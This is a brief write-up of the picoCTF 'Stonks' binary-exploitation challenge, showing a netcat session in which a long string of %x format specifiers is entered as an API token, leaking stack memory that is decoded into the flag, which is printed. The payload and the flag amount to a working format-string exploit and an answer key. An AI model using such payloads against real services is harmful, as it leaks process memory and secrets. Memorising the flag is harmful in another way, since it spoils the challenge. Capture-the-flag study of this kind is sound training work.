# Retos PicoCTF


## Objetivo 

I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/a4ce675e8f85190152d66014c9eebd7e/vuln.c) `nc mercury.picoctf.net 59616`
## Solución 

```
                                                                             
┌──(kali㉿kali)-[~/picoCTF/retos-resueltos/binexp/stonks]
└─$ nc mercury.picoctf.net 59616
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
Buying stonks with token:
8b503f0804b00080489c3f7f5cd80ffffffff18b4e160f7f6a110f7f5cdc708b4f18038b503d08b503f06f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3834313634356562ffb8007df7f97af8f7f6a44044bef30010f7df9ce9f7f6b0c0f7f5c5c0f7f5c000ffb88418f7dea68df7f5c5c08048ecaffb884240f7f7ef09804b000f7f5c000f7f5ce20ffb88458f7f84d50f7f5d89044bef300f7f5c000804b000ffb884588048c868b4e160ffb88444ffb884588048be9f7f5c3fc0ffb8850cffb88504118b4e16044bef300ffb8847000f7d9ffa1f7f5c000f7f5c0000
Portfolio as of Wed Nov 13 02:45:13 UTC 2024


3 shares of TIXN
34 shares of KZ
69 shares of E
24 shares of TFG
34 shares of OWO
410 shares of HPTP
655 shares of MO
667 shares of RSZ
Goodbye!
picoCTF{I_l05t_4ll_my_m0n3y_6148be54}

from hex 
swap endianness en cyberchef

```

## Notas adicionales 

## Referencias 
